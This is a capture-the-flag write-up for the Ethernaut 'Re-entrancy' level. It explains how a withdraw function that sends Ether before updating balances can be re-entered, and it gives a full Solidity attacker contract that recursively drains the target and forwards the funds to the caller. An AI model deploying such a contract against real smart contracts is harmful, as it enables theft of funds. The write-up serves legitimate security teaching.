---
layout: writeup
title: "Re-entrancy"
level: "Intermediate"
category: "Ethernaut"
description: "Drain a contract's entire balance by recursively calling the withdraw function before the state updates."
---

## Analysis

The vulnerability exists in the `withdraw` function because it follows an insecure pattern: it sends Ether to the user **before** updating their balance in the contract's state.

**The Flaw:**
The contract uses `msg.sender.call{value: _amount}("")`. When this line executes, the control of the execution flow is handed over to the `msg.sender`. If the sender is a malicious contract, it can use its `receive()` function to call `withdraw()` **again**.



Because the first call hasn't reached the line where it subtracts the balance (`balances[msg.sender] -= _amount`), the contract thinks the attacker still has funds and sends Ether again. This repeats until the contract is drained.

---

## Solution

You must deploy an attacker contract that initiates the first withdrawal and then uses its `receive` function to "re-enter" the victim contract.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint);
    function withdraw(uint _amount) external;
}

contract AttackReentrance {
    IReentrance public target;

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    // Fallback is called when Ether is sent
    receive() external payable {
        if (address(target).balance >= 0.001 ether) {
            target.withdraw(0.001 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need some ETH");
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    // Withdraw stolen funds to your address
    function withdrawAll() external {
        msg.sender.transfer(address(this).balance);
    }
}

</code></pre>

---